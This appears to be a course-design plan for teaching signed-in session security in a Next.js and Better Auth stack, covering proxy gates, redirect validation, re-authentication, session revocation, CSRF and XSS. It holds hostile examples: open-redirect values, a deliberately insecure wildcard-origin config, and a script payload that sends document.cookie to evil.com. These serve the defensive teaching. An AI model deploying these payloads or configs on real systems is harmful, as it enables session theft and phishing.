# Chapter 9.4 — The signed-in session: gates, credentials, devices, defenses: pedagogical approach

## Concept 1 — The two-layer gate: cookie-presence at the perimeter, validating read at the door

**Why it's hard.** A junior reads "the proxy protects the route" and treats the proxy as the security boundary. The senior reading is the inverse: the proxy is the *cheap perimeter gate* (cookie-shaped? pass; otherwise redirect) and the layout's `requireUser()` is the *validating read* (cookie verified against DB, principal known). Conflating them ships two specific bugs: a proxy that calls `auth.api.getSession` round-trips the database on every Next.js 16 prefetch (and 16 prefetches *protected* routes on hover); a proxy that does role checks becomes the entire security model, and a missed matcher entry silently opens a route. The student has to feel the prefetch frequency *and* the matcher-miss failure mode to see why authn-shaped checks live in the proxy and authz-shaped checks never do.

**Ideal teaching artifact.** Concept archetype delivered as a **two-frame contrast scrub** in `DiagramSequence`. The student watches the same `/dashboard` request animate through the stack twice. *Frame A — the broken proxy*: proxy calls `auth.api.getSession`, which queries `session` in Postgres, then the layout *also* calls `auth.api.getSession` for `requireUser()` — two round-trips per request. A counter overlay tallies prefetches: a user hovering over five dashboard links from `/` fires five proxy calls, each a DB round-trip — twelve queries before any page is even clicked. *Frame B — the senior gate*: proxy calls `getSessionCookie` (pure cookie parse, zero DB), passes through if the cookie is shaped, redirects if not; the layout calls `requireUser()` which *does* hit the cookie cache or DB, but only when the user actually clicks. The same five-hover sequence now fires zero queries from the proxy and one query when a click lands. Below the two frames, a small ledger pins the cost: *broken — 1 DB query per matched request including prefetches; senior — 0 DB queries in the proxy, 1 in the layout per real navigation*. The closing rule lands as a one-liner: *the proxy is the perimeter, the layout is the door; the perimeter checks shape, the door checks identity.*

**Engagement.** A `MultipleChoice` round of three scenarios after the scrub: *"a teammate's PR moves the role check from `authedAction` into `proxy.ts` 'so unauthorized requests die earlier'"* — the right answer names the matcher-miss bug (one missing path = one open route) and the prefetch cost; *"a teammate's PR adds `auth.api.getSession` to the proxy to 'always have the user available'"* — the right answer names the prefetch-amplification bug and points at `getCurrentUser` in the layout as the right surface; *"a teammate removes the layout's `requireUser()` call because 'the proxy already validated'"* — the right answer names the cookie-cache stale-read window and the "cookie can be forged" surface, ties to the senior reflex *the layout's read is the source of truth, the proxy is optimistic*.

**Components.**
- `DiagramSequence` for the two-frame contrast (broken proxy vs senior gate) with the prefetch counter overlay and the cost ledger below — reuses the parallel-lanes shape installed in 9.1 Concept 3 and used across the unit.
- `MultipleChoice` for the three-scenario round.
- `Aside` (`note`) below the scrub: "the proxy is the perimeter (cheap, optimistic, cookie-shape only); the layout is the door (validating read, source of truth). DB reads in the proxy break under prefetch."

**Project link.** The 9.5 project's `proxy.ts` (lesson 9.5.5) ships `getSessionCookie` only and the protected layout's `requireUser()` is the validating read; the contrast scrub is the *why* the project doesn't reach for `auth.api.getSession` in the proxy and the *frame* lesson 9.5.6 uses to verify the request count in the network tab.

## Concept 2 — Matcher design, `?next=` round-trip, and the inverse gate as one composed surface

**Why it's hard.** Three proxy decisions land together in the same file, and the student treats them as separate puzzles instead of one composed rule set. The *matcher* picks which paths the gate runs on (allowlist vs matchall-minus-public — pick one, document it; mixing leaves new routes unprotected by default). The `?next=` round-trip preserves the original destination through the sign-in detour, but reflecting it raw is an open-redirect; the closure rule (paths starting with `/`, no `//`, no protocol-relative, no absolute URLs) is the 5.5.3 rule applied at the call site. The *inverse gate* — auth pages refuse signed-in users — uses the same matcher logic in the opposite direction, and skipping it leaves a signed-in user looking at a sign-in form, which is broken UX *and* a re-auth security smell. The three decisions read as plumbing in the docs; the student needs to see them as *one decision surface* where each piece closes a specific bug class.

**Ideal teaching artifact.** Decision archetype delivered as a **three-tab configuration walkthrough with a worked-failure per tab** rendered in `TabbedContent`. *Tab 1 — matcher strategy*: a hand-coded HTML two-row comparison table (allowlist vs matchall-minus-public) with four columns — *what it matches*, *senior fit*, *failure mode of the wrong pick*, *the documentation-reflex that ships*. Allowlist fits small protected sections; matchall-minus fits mostly-gated apps; the failure mode of mixing is "a partial allowlist leaves new routes unprotected by default." *Tab 2 — the `?next=` round-trip*: a four-frame hand-SVG inside `Figure` walking the round-trip — *(1) signed-out user types `/dashboard/invoices/inv_42`*, *(2) proxy redirects to `/sign-in?next=%2Fdashboard%2Finvoices%2Finv_42`*, *(3) sign-in form reads `next`, validates against the closure rule, threads it into the action*, *(4) on success the action redirects to the validated `next` or to `/dashboard` if the validation rejected*. A side panel shows two `next` values rejected by the closure (`https://evil.com/phish`, `//evil.com`) with the attack each one would land. *Tab 3 — the inverse gate*: a small `Code` block showing the proxy's two matched conditions side by side — *protected path + no cookie → redirect to `/sign-in?next=...`*, *auth path + cookie present → redirect to `/dashboard`* — with a worked failure underneath: skipping the inverse gate leaves a signed-in user on `/sign-in` clicking "Sign in" with a stale form, sometimes invalidating the current session. Below the tabs, a closing rule: *one matcher, one closure, one inverse — a partial implementation leaks at the missing piece.*

**Engagement.** A `Buckets` sort: ten `next` values into two columns — *safe to redirect to* / *reject and fall back to `/dashboard`*. Examples: `/dashboard/invoices/inv_42` (safe), `https://app.example.com/dashboard` (reject — absolute URL), `//evil.com/phish` (reject — protocol-relative), `/billing` (safe), `javascript:alert(1)` (reject — scheme), `evil.com` (reject — no leading slash), `/sign-in` (safe but pointless — the inverse gate would catch the loop), `/dashboard?next=evil.com` (safe — query strings on safe paths are fine, the closure runs on the path), `/../../etc/passwd` (reject — path traversal even if browser normalizes), `/` (safe — fall-back-equivalent but explicit). Wrong-answer feedback names the attack each leak enables. Confirmed by a `MultipleChoice`: "a teammate's PR ships the proxy with allowlist matcher `['/dashboard/:path*']` and adds `/billing` and `/admin` later as the product grows. What's the failure mode?" — the right answer names the matcher-drift bug (every new gated section needs a matcher update; the team will forget; the right move is to document the matcher as part of the "new protected route" review checklist or to flip to matchall-minus-public).

**Components.**
- `TabbedContent` for the three-tab walkthrough — matcher / `?next=` / inverse — with hand-coded HTML inside tab 1, hand-SVG inside `Figure` inside tab 2, and a `Code` block inside tab 3.
- `Buckets` for the ten-value `next`-closure sort.
- `MultipleChoice` for the matcher-drift confirmation.
- `Aside` (`caution`) below the tabs: "matcher pick is a documented decision, never a mix. The `?next=` closure is the 5.5.3 rule at the call site. The inverse gate uses the same matcher in reverse — skip it and signed-in users land on a stale sign-in form."

**Project link.** The 9.5 project's `proxy.ts` ships an allowlist matcher with `?next=` closure and the inverse gate; the three-tab walkthrough is the *frame* lesson 9.5.5 builds against, with the closure rule cited as load-bearing in 9.5.6's verification probes (curl the proxy with a hostile `next` value, expect the fallback).

## Concept 3 — The elevation tier: fresh-session vs current-password vs both

**Why it's hard.** "Elevation" sounds like one thing and is actually two distinct mechanisms protecting different surfaces, and picking the wrong one (or doubling up unnecessarily) ships either a security gap or unnecessary friction. *`freshAge`* (the time-since-authentication window from 9.2.3) covers actions that *don't have a credential to re-prove* — passkey add, 2FA disable, account delete. *Current-password prompt* covers actions that *have a credential to re-prove* — password change, email change with the password as the proof. Conflating them ships specific bugs: defaulting destructive actions to `freshAge`-only means a fresh session on a borrowed laptop can change the password without typing it; defaulting credential changes to current-password-only without `freshAge` means a stale session that *knows* the password (browser autofill on a public machine) can rotate credentials silently. The student needs the two mechanisms as a *decision tree by action type*, not as interchangeable flavors of "extra check."

**Ideal teaching artifact.** Decision archetype delivered as a **two-axis decision matrix paired with a worked elevation flow** rendered as a hand-coded HTML table inside `Figure` plus a small `DiagramSequence`. The matrix has two columns — *action has an existing credential to re-prove (Y/N)* — and two rows — *session is fresh within `freshAge` (Y/N)*. Each cell names the elevation pattern and the library's behavior: *(Y/Y)* current-password prompt at the form, library proceeds; *(Y/N)* current-password prompt at the form, library proceeds — `freshAge` doesn't add value when the credential is being re-proven; *(N/Y)* `freshAge` gate inside the library endpoint, no extra prompt; *(N/N)* library returns the `'requires-re-authentication'` Result, UI replaces the form with a mini sign-in, on success returns to the action retryable. Each cell carries one example action: change password, change email, add passkey on a fresh session, disable 2FA on a stale session. The `DiagramSequence` to the right walks the *(N/N)* case as a four-frame flow — *(1) user clicks "Disable 2FA" on a 3-day-old session*, *(2) action calls library, library returns `'requires-re-authentication'`*, *(3) UI swaps the form for a mini sign-in: "for security, sign in again to continue"*, *(4) on success the user is bounced back to `/settings/security`, the action is retryable* — the punchline is that the re-auth uses `signIn.email` (not a custom password-verify endpoint), so it issues a fresh session and the rate-limit / fixation defenses still apply.

**Engagement.** A `Matching` exercise pairing six destructive-action surfaces against the elevation pattern that owns them — *change password* ↔ current-password prompt; *change email* ↔ current-password prompt; *add passkey on a session 12 hours old* ↔ `freshAge` gate, no prompt; *disable 2FA on a session 3 days old* ↔ `'requires-re-authentication'`, mini sign-in; *delete account on a fresh session* ↔ `freshAge` gate (app-owned destructive action, reach the helper explicitly); *sign out from a single device* ↔ no elevation (the action is its own consent). Confirmed by a `MultipleChoice`: "a teammate's PR adds a custom 'verify your password' modal that calls a hand-rolled `/api/verify-password` endpoint to gate the `Disable 2FA` button on a stale session. What does the senior reviewer call out?" — the right answer names two bugs (the custom endpoint bypasses the per-IP / per-account rate limits from 9.3.2 and the session-fixation defenses from 9.1; the right surface is `signIn.email` which issues a fresh session and clears the elevation gap structurally, not "verify the password and pretend the session is fresh").

**Components.**
- `Figure` wrapping a hand-coded HTML 2×2 elevation matrix with one example action per cell.
- `DiagramSequence` for the four-frame `'requires-re-authentication'` flow — reuses the per-flow scrub shape from Concepts 1 and 2.
- `Matching` for the six-action elevation pairing.
- `MultipleChoice` for the custom-verify-endpoint diagnosis.
- `Aside` (`note`) below the matrix: "current-password covers credential re-proves; `freshAge` covers everything else; the `'requires-re-authentication'` branch routes through `signIn.email`, never through a hand-rolled verify endpoint."

**Project link.** The 9.5 project explicitly cuts credential mutation, so the elevation matrix doesn't fire at the keyboard there; it's the *frame* lessons 9.4.2 and 9.4.3 lean on when wiring `useActionState` against the new Result discriminant, and the *why* the chapter quiz tests the "fresh-session is not enough for credential change" rule as a non-negotiable.

## Concept 4 — `changePassword` with `revokeOtherSessions: true` as the senior default, and the OAuth-only-user `setPassword` edge

**Why it's hard.** Two reflexes ship the same bug. (1) The library defaults `revokeOtherSessions` to `false`; the student copy-pastes the example and the senior invariant from 9.3.4 (a credential change kills every other session) silently dies — the user changes their password "because something felt off" and the attacker's session, the entire reason for the change, stays alive. (2) An OAuth-only user (signed up via Google, no `'credential'` row in `account`) calls `changePassword` and the library returns an error the student wires up as "wrong password," surfacing confusing UX; the right call is `setPassword`, which *adds* the credential row, not changes it. The two failure modes look unrelated until the student sees them as the same misframe — `changePassword` assumes a credential exists *and* assumes the existing sessions don't need to die — and the senior fix at the form is one default-flip plus one branch on the `'no-password-set'` Result.

**Ideal teaching artifact.** Pattern archetype delivered as a **wrong-by-default before/after replay** in `CodeVariants` paired with a small **OAuth-only-user state branch**. *Tab 1 (broken)*: `authClient.changePassword({ currentPassword, newPassword })` with no `revokeOtherSessions` flag, plus a hand-SVG-inside-`Figure` panel to the right showing the database state — three `session` rows for the user across phone / laptop / work-laptop; after the call, all three rows still exist, only `account.password` changed. The narrative caption: "the attacker's cookie still points at a valid session row; the password change touched nothing they're using." *Tab 2 (senior baseline)*: same call with `revokeOtherSessions: true` added on a highlighted line; the same panel now shows the post-call state — only the *current* session row survives, the other two are deleted, the attacker's cookie 401s on the next request. Below the two tabs, a small `Aside` (`caution`) names the rule. *Beat two — the OAuth-only-user branch*: a `Code` block showing the action's Result-handling shape with a `'no-password-set'` discriminant — when the current user has no `'credential'` row, the action returns this discriminant; the form replaces itself with "you sign in with Google — set a password to enable email+password sign-in" and a *different* form that calls `setPassword` (which inserts the `'credential'` row). The shape of the second form is identical except for the absent `currentPassword` field — the user has nothing to re-prove, so `freshAge` is the gate. A small ledger underneath names what each call mutates: `changePassword` updates one `account` row; `setPassword` inserts one `account` row.

**Engagement.** A `MultipleChoice` round of three scenarios: *"the team ships `changePassword` with the library defaults"* — the right answer names the missing `revokeOtherSessions: true` and the attacker-keeps-the-session bug; *"a Google-signup user clicks 'Change password' and gets 'invalid credentials'"* — the right answer names the missing `'no-password-set'` branch and the right surface (`setPassword`, not `changePassword`); *"the team adds `revokeOtherSessions: true` but also keeps the old session alive 'so the user doesn't get logged out of the tab they're in'"* — the right answer names the senior shape (the *current* session is preserved by definition; `revokeOtherSessions` only kills the *other* ones; the user-facing copy is "you've been signed out of your other devices"). Confirmed by a `Tokens` exercise on the canonical action body: the student clicks `revokeOtherSessions: true` (load-bearing), `'no-password-set'` (the OAuth-only-user branch), and the `setPassword` call (the right surface for the credential-add path) — three correct picks across the action's senior shape, with feedback naming the bug each one closes.

**Components.**
- `CodeVariants` for the wrong/right replay of the `changePassword` call, with a hand-SVG-inside-`Figure` session-rows panel embedded in each tab — the visual substrate from 9.4.3's session-row diagrams reused at small scale.
- `Code` block for the OAuth-only-user branch with the `setPassword` shape.
- `MultipleChoice` for the three-scenario round.
- `Tokens` on the senior action body for the three load-bearing tokens.
- `Aside` (`caution`) below the variants: "`revokeOtherSessions: true` at every credential change. `setPassword` for OAuth-only users — never `changePassword`. The library defaults ship the bug; the senior baseline closes it."

**Project link.** The 9.5 project cuts credential mutation; the replay is the *why* the project's scope panel cites lesson 9.4.2 as "the senior baseline for credential change" rather than "we'll add it later," and the *frame* the chapter quiz uses to test `revokeOtherSessions: true` as a non-negotiable.

## Concept 5 — Change-email verifies on the *current* address, not the new one

**Why it's hard.** The naive shape — "the user wants to change their email to X, send a verification link to X" — is the wrong one and ships a real attack. The threat model is the *briefly-compromised account*: an attacker with a momentary session (borrowed laptop, XSS, a cookie sniffed off open wifi) immediately tries to change the email to one they control; if verification rides on the *new* address, the attacker confirms it themselves and the legitimate user's recovery path is gone. Verifying on the *current* address closes this — the legitimate user (who still controls the existing inbox) sees "your email is being changed to X, click to confirm or click to reject" and the attack collapses. The student's reflex is to copy the email-verification flow from 9.3.3 exactly (which sends to the address being verified) and miss the inversion. The discipline has to land as a *threat-driven design choice*, not as a library quirk to memorize.

**Ideal teaching artifact.** Decision archetype delivered as a **two-lane attacker-replay** in `DiagramSequence`, mirroring 9.3.4's session-invalidation replay and 9.1.3's stolen-laptop incident. The student scrubs through the same five-frame attack in two parallel lanes — *verify on new email (broken)* on the left, *verify on current email (senior baseline)* on the right. *Frame 1*: attacker hijacks Ada's session (any vector — borrowed laptop, XSS, anything). *Frame 2*: attacker opens `/settings/security` and submits change-email to `attacker@evil.com`. *Frame 3*: server queues the verification. *Left lane*: link sent to `attacker@evil.com`; attacker clicks; email flips. *Right lane*: link sent to `ada@acme.com` (Ada's existing inbox); the email body says "your email is being changed to attacker@evil.com — click to confirm, or click reject if this wasn't you." *Frame 4*: Ada (who still controls her inbox) opens the email. *Left lane*: Ada never sees anything; her account is gone, the attacker controls password reset. *Right lane*: Ada clicks "reject," the verification row is deleted, the attacker's change is dead, the system sends a "wasn't you?" email with a "kill all sessions and force password reset" link. *Frame 5*: a small ledger underneath names the asymmetry — *left: the new-email holder is the only verifier, the legitimate user has no veto; right: the current-email holder is the verifier, the attacker can't reach the inbox they don't control*. The closing rule lands as one line: *verify on the address you're proving control of, which is the address that already has access — the new address can be verified later through the natural use of the changed account*.

A short second beat below the replay walks the senior triple — *verify on current address* + *send a "your email is being changed to X" notice to the current address (informational, in addition to the verify link)* + *send a "your email was changed" notice to **both** addresses after the flip* — as the three-message shape that turns the flow into a takeover-detection signal even when the attacker controls the session.

**Engagement.** A `MultipleChoice` round of three scenarios: *"the team ships change-email verifying on the new address 'because that's how email-verification at sign-up works'"* — the right answer names the briefly-compromised-account attack and ties to the threat-model shift (sign-up is proving control of an unowned address; change-email is preserving control by an existing owner); *"the team verifies on the current address but skips the 'wasn't you?' notice to the current address"* — the right answer names the takeover-detection gap (verification alone doesn't surface the attempt to the legitimate user if they're not the one initiating; the informational notice makes the attempt visible); *"the team's product wants 'dual verification' — both addresses must confirm"* — the right answer names this as a deliberate-reach option (some banks use it; it adds friction; the SaaS year-1 default is current-address-only plus the post-change notice to both, with dual verification a conditional reach if compliance demands it). Confirmed by a `Sequence` ordering of the senior change-email flow: *(1) user submits change-email form with new address*, *(2) server creates `verification` row keyed `change-email:<userId>:<newEmail>`, hashed token*, *(3) library sends verification link to **current** address*, *(4) app sends informational "email change requested" notice to **current** address (parallel)*, *(5) user clicks link in current inbox*, *(6) server validates token, updates `user.email`, deletes verification row, optionally revokes other sessions*, *(7) app sends "your email was changed" notification to **both** addresses through Unit 8 pipeline*. One distractor: *"send the verification link to the new address as well, for redundancy"* (no — that re-opens the entire attack the current-address verification was designed to close).

**Components.**
- `DiagramSequence` for the five-frame two-lane attacker replay — reuses the parallel-lanes shape from 9.1 Concept 3, 9.3 Concept 4, and 9.3 Concept 6.
- `MultipleChoice` for the three-scenario round.
- `Sequence` for the seven-step senior flow with one substrate-aware distractor.
- `Aside` (`caution`) below the replay: "verify on the current address — the inbox the legitimate user already controls. Send a notice to both addresses after the flip. The library default is current-address verification; the threat model is what makes that default the right one."

**Project link.** The 9.5 project cuts change-email; the replay is the *why* lesson 9.4.2 ships current-address verification as the only correct shape and the *frame* the quiz uses to test the "verify on the address you're proving control of, not the address you're claiming" rule.

## Concept 6 — The active-sessions list, current-session detection, and the cookie-cache staleness window

**Why it's hard.** The list itself is mechanical — `auth.api.listSessions` returns the array, the row UX parses `userAgent` for device guess and `ipAddress` for approximate location. Two pieces are *not* mechanical and bite hard if missed. (1) *Current-session detection* — the row whose `token` matches the request's cookie is the user's current session; without a "this session" badge plus an explicit confirm on revoke, the user accidentally signs themselves out mid-form when trying to kill an old desktop session. (2) *The cookie-cache staleness window* — from 9.2.3, if cookie cache is on (5-minute default), a revoked session still reads as valid for up to 5 minutes on the cached path. The student treats revoke as instant and ships a "session was revoked" toast that lies; the user keeps using the app for four more minutes and concludes the revoke didn't work. The two pieces have to land together because they share the same root: *the cookie is what the request carries, the row is what makes it real, and the cache between them is an asymmetric trade*.

**Ideal teaching artifact.** Mechanics + Pattern composite. *Beat one — the row UX walkthrough:* a `Figure`-wrapped hand-SVG drawing the active-sessions list as the user sees it, with three rows annotated — *"Chrome on macOS · San Francisco, CA · last active 2 minutes ago · this session"* (current-session badge, revoke button greyed with "use Sign Out instead"), *"Safari on iPhone · San Francisco, CA · last active 3 hours ago"* (revoke button, primary), *"Chrome on macOS · Bangalore, IN · last active 2 days ago"* (revoke button, plus a subtle "unfamiliar?" indicator). Each annotation points at the column it parsed from the `session` row — `userAgent` → device, `ipAddress` → location, `updatedAt` → last active, `token` matched against current cookie → current-session badge. The Bangalore row is the hook for Concept 7 (the new-device-detection email turns this from passive list to active signal). *Beat two — the staleness window:* a four-frame `DiagramSequence` walking the cache-vs-revoke collision — *(1) Ada is signed in on three devices, cookie cache on with 5-minute `maxAge`*, *(2) Ada clicks "Revoke" on the desktop row at 10:00:00; library deletes the `session` row, returns success, UI shows the row gone*, *(3) the desktop browser (cached payload still valid by signature until 10:04:30) navigates to `/dashboard` at 10:01:00; server reads cached payload, sees a valid session, serves the page*, *(4) at 10:04:30 the cache TTL expires; the next request hits the DB; row is gone; 401; redirect.* A small overlay names the *user-facing copy that doesn't lie*: "session was revoked; may take up to 5 minutes to take effect on currently-open tabs" — the staleness window made visible at the edge of the UX, not hidden.

**Engagement.** A `MultipleChoice` round of three scenarios: *"the team ships the list without a current-session badge"* — the right answer names the self-revoke-mid-form bug; *"the team's UX shows 'session revoked successfully' immediately and assumes the desktop browser is signed out"* — the right answer names the cookie-cache window, the lie-by-omission, and the right copy; *"the team disables the cookie cache on the entire app to make revoke instant"* — the right answer names the asymmetric trade (every authenticated read now hits the DB; for low-stakes surfaces this is wasteful), names the senior alternative (disable the cache only on the `/settings` subtree via the matcher in 9.2.3's config, or shorten `maxAge` to 30 seconds for the destructive surface). Confirmed by a `Matching` exercise pairing six row-UX signals against the `session` column they parse from — *device label* ↔ `userAgent`, *approximate location* ↔ `ipAddress` (via GeoIP), *last active* ↔ `updatedAt`, *signed in N days ago* ↔ `createdAt`, *current session badge* ↔ `token` matched against current cookie, *"unfamiliar location" indicator* ↔ `ipAddress` cross-checked against the user's recent IP history (the hook for Concept 7's notification email).

**Components.**
- `Figure` wrapping a hand-SVG list-UX mock with three annotated rows showing the row-to-column mapping.
- `DiagramSequence` for the four-frame staleness-window walkthrough — reuses 9.2 Concept 6's collision-walkthrough shape.
- `MultipleChoice` for the three-scenario round.
- `Matching` for the six-signal column pairing.
- `Aside` (`caution`) below the walkthrough: "the cookie cache window is real; the UX copy must name it. Current-session detection is non-negotiable — never let the user accidentally revoke the session they're using."

**Project link.** The 9.5 project doesn't ship the active-sessions list; the row-UX walkthrough is the *frame* lesson 9.4.3 builds against, and the cookie-cache staleness window ties back to 9.2 Concept 6's same trade — the student arrives knowing the asymmetry and recognizes the matcher-based mitigation when 9.4.3 names it.

## Concept 7 — The revoke trio, plus the new-device email that turns the list into detection

**Why it's hard.** Three nearly-identical method names with three distinct semantics, and the wrong one in the wrong button ships either a footgun or a confusing UX. `revokeSession({ token })` deletes one specific session; `revokeOtherSessions()` deletes every session *except the current one* (the credential-change auto-trigger from Concept 4); `revokeSessions()` deletes *every* session including the current one and signs the user out of the active device. Conflating "sign out everywhere" copy across the three ships a real bug — a button labeled "sign out everywhere" that calls `revokeOtherSessions` doesn't sign the user out of the current device, the user thinks they did but their phone (the device they were just on) is still logged in. The second half of the concept is the *active reach*: the active-sessions list is detection only if the user looks; a "new device signed in" email (sent through the Unit 8 pipeline when sign-in lands a new IP+userAgent combination) turns a passive list into an active takeover-detection signal that fires regardless of whether the user opens the settings page.

**Ideal teaching artifact.** Reference + Pattern composite. *Beat one — the trio comparison card:* a `Figure`-wrapped hand-coded HTML three-row comparison table with four columns — *method*, *what it deletes*, *current session disposition*, *the button it belongs on*. `revokeSession({ token })`: deletes one row by token; current session unaffected unless that's the token passed; the per-row "Revoke" button on a non-current row, with a confirm modal. `revokeOtherSessions()`: deletes every row except the current; current session preserved; the prominent "Sign out everywhere except this device" button on `/settings/security`, *and* the auto-trigger from `changePassword({ revokeOtherSessions: true })`. `revokeSessions()`: deletes every row including current; the user is signed out of the active device and bounced to `/sign-in`; the explicit "Sign me out of every device including this one" button, distinct from `revokeOtherSessions`. The fourth column (button copy) is the load-bearing one — the table teaches the *naming discipline* that prevents the conflated-copy bug. *Beat two — the new-device-detection loop:* a four-frame hand-SVG inside `Figure` showing the audit closure — *(1) attacker signs in from a new IP+userAgent combo with stolen credentials at 02:00*, *(2) library's sign-in hook detects "this (IP, UA) pair has not been seen for this user" and queues an email through the Unit 8 pipeline to the user's verified address*, *(3) at 07:00 Ada wakes up, sees "new sign-in from Bangalore" in her inbox*, *(4) Ada clicks the "wasn't you?" link → app revokes all other sessions (`revokeOtherSessions` triggered with elevation), forces password reset on next sign-in*. The closing rule lands as one line: *the active-sessions list is detection only if the user looks; the new-device email is the active signal that closes the loop.*

**Engagement.** A `Buckets` sort: nine button copy strings into three columns named for the three revoke methods — examples like "Sign out of this iPhone session" → `revokeSession` (specific row), "Sign out of all my other devices" → `revokeOtherSessions`, "Sign me out everywhere including here" → `revokeSessions`, "Sign out everywhere" (ambiguous — the trap; the right answer is "rewrite the copy because it doesn't disambiguate; pick `revokeOtherSessions` with explicit copy or `revokeSessions` with explicit copy"). Confirmed by a `MultipleChoice`: "the team ships an active-sessions list with the revoke trio and considers the security surface complete. ## Concept 8 — CSRF in the 2026 stack: `SameSite=Lax` plus the Server Actions origin check, and what would undo it

**Why it's hard.** The student arrives carrying CSRF token reflexes from 2018 — synchronizer tokens, double-submit cookies, hidden fields per form — and either bolts them onto a stack that already closes the threat structurally (over-engineering) or assumes "we don't need CSRF tokens, we don't need to think about CSRF" (under-engineering). The 2026 truth is in between: `SameSite=Lax` on the session cookie *plus* the Server Actions origin check (Next.js 16's framework-level rejection of cross-origin Action POSTs) close the threat structurally for the same-origin SaaS shape, and the team's job is to *not undo the defaults*. The footguns are specific: flipping `SameSite=None` to "fix" a cross-origin embed undoes the whole defense; adding `Domain=example.com` to the cookie so a marketing subdomain can read it turns every subdomain into an attack surface; widening `serverActions.allowedOrigins` casually re-opens what the framework closed. The student needs to see the attack the defaults close, *and* see the specific changes that would re-open it, so the discipline reads as "preserve the defaults, name the architecture problem when the cookie attribute feels like the problem."

**Ideal teaching artifact.** Concept + Pattern composite. *Beat one — the structural defense:* a hand-SVG inside `Figure` drawing the attack-and-defense in three actors — *attacker site (`evil.com`)*, *user's browser*, *app server (`app.example.com`)*. The attacker hosts a form that POSTs to `app.example.com/api/transfer`. Frame the diagram as a request-attempt: the user (signed into the app) visits `evil.com`, the form submits, the browser would normally attach the session cookie. *The diagram draws two refusal points*: (a) the browser refuses to send the `__Host-session` cookie because `SameSite=Lax` blocks it on cross-site POSTs — annotated *"cookie not attached, request lands without a session, action returns 401"*; (b) even if the cookie somehow rode, the framework's origin check at the Server Action layer rejects the request because `Origin` doesn't match `serverActions.allowedOrigins` — annotated *"two layers, both structural, neither requires app-layer code"*. The diagram makes visible what the defense looks like *as the request fails*. *Beat two — the four-footgun catalog:* a small hand-coded HTML table with four rows — *the change*, *what it lets in*, *the senior alternative*. Row 1: *flip `SameSite=None`* / re-opens cross-site POST CSRF / fix the architecture, not the cookie. Row 2: *add `Domain=example.com` to the cookie* / every subdomain (including the marketing site, the Storybook preview, that one hackathon experiment) is now an attack surface / sibling sites sign in independently. Row 3: *widen `serverActions.allowedOrigins`* / the framework backstop is gone for added origins / treat any addition as a security review. Row 4: *add `'*'` to `trustedOrigins` in Better Auth* / auth cookies set on requests from any origin / never `'*'`, name the legitimate origins explicitly (mobile webview, browser extension). Below the catalog, a one-paragraph closing rule: *the structural defense is the cookie attribute plus the framework's origin check; CSRF tokens are the legacy layer this stack doesn't need; cross-origin auth endpoints are the conditional reach where tokens earn the call back, but solve the architecture first*.

**Engagement.** A `MultipleChoice` round of three scenarios: *"the team adds a marketing iframe at `marketing.example.com` that needs to display the user's name"* — the trap is "add `Domain=example.com` to the session cookie"; the right answer names the subdomain-attack-surface bug and the alternative (the marketing site signs in independently via its own session, or the iframe receives the user's name via `postMessage` from the parent app, never via the auth cookie); *"the team's mobile app hits `api.example.com` from a webview"* — the right answer names this as the genuinely-cross-origin case where `SameSite=Lax`'s assumption breaks, and walks the conditional layers (a custom header that the attacker site can't forge without CORS preflight, or a Bearer token in `Authorization` for the mobile client, never widening `SameSite` for the browser surface); *"a teammate's PR adds a hand-rolled CSRF token to every Server Action 'for defense in depth'"* — the right answer names this as over-engineering for the same-origin shape (`SameSite=Lax` + framework origin check + `__Host-` prefix already provide three layers; adding tokens adds maintenance debt without closing a real threat for this surface), with the conditional carve-out that tokens earn the call when a legitimate cross-origin endpoint exists. Confirmed by a `Tokens` exercise on a deliberately-broken Better Auth config snippet — `trustedOrigins: ['*']`, `defaultCookieAttributes: { sameSite: 'none' }`, `serverActions: { allowedOrigins: ['*'] }` — the student clicks each broken token and gets a one-line reveal naming the structural defense each break undoes.

**Components.**
- `Figure` wrapping a hand-SVG three-actor attack-and-defense diagram showing the two refusal points (browser cookie withhold, framework origin check) on the same cross-site POST attempt.
- `Figure` wrapping a hand-coded HTML four-row footgun catalog.
- `MultipleChoice` for the three-scenario round.
- `Tokens` on the broken-config snippet for the per-token reveal of the structural defenses.
- `Aside` (`caution`) below the catalog: "preserve the defaults; name the architecture when the cookie attribute feels like the problem; CSRF tokens are the conditional reach for cross-origin endpoints, not the default for the same-origin SaaS surface."

**Project link.** The 9.5 project ships the Better Auth defaults — `__Host-` cookie, `SameSite=Lax`, `trustedOrigins: [baseURL]` — and the three-actor diagram is the *why* the project's lesson 9.5.6 verification probes a curl POST from a fake origin and expects the 401, not as a test of the team's code but as a test that the defaults are still in place.

## Concept 9 — XSS in the 2026 stack: React 19 escapes, `HttpOnly` carries the cookie, `dangerouslySetInnerHTML` is the one footgun

**Why it's hard.** The student knows "XSS is bad" abstractly and either over-trusts React ("the framework escapes everything, we're fine") or builds defense-in-depth on the wrong layer ("we need a CSP before we can ship"). The 2026 truth is layered: React 19's auto-escaping closes the *common* vector at every `{value}` in JSX (including the `javascript:` href rejection in dev/prod); `HttpOnly` on the session cookie ensures even successful script execution can't exfiltrate the credential; `dangerouslySetInnerHTML` is the single, named, grep-able bypass that the team must sanitize before reaching for; CSP is the second-layer defense-in-depth that closes the gap when sanitization fails, with the full configuration deferred to 17.3. The student needs the *parallel structure with Concept 8* (default + footgun + named-but-not-built second layer) so the discipline reads as one shape across both threats, not as two unrelated topics — and they need the `DOMPurify` shape concretely because "sanitize the HTML" without the allowlist config is the most common shipping-but-broken move.

**Ideal teaching artifact.** Concept + Pattern composite, mirroring Concept 8's two-beat structure so the parallel reads on sight. *Beat one — the structural defense:* a hand-SVG inside `Figure` drawing the attack-and-defense as one diagram with three layers stacked vertically. The attacker's payload is `<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>` injected via a comment-form input. *Layer 1 — React 19 auto-escape*: every `{value}` in JSX renders the payload as the literal string `&lt;script&gt;...&lt;/script&gt;` — the script never executes. Annotated: *"closes the common vector at every render site in the app, free, structural."* *Layer 2 — `HttpOnly` on the session cookie*: even if the attacker bypasses layer 1 (via a `dangerouslySetInnerHTML` they didn't sanitize, or an `href={userUrl}` with a `javascript:` scheme on legacy React, or a future bypass), `document.cookie` cannot read the session cookie because the browser refuses. Annotated: *"the credential survives even when the script runs, ties back to 9.1 Concept 4's `HttpOnly` token."* *Layer 3 — CSP (named, not configured here)*: the third layer; *"closes the residual gap when both layers fail, but the configuration is 17.3's territory."* The diagram makes visible what *each layer catches* and where the gaps would be without it. *Beat two — the footgun and the sanitization shape:* a `CodeVariants` with two tabs. *Tab 1 (broken)*: `<div dangerouslySetInnerHTML={{ __html: post.body }} />` where `post.body` is rich-text user input. The hand-SVG annotation underneath shows the payload reaching the 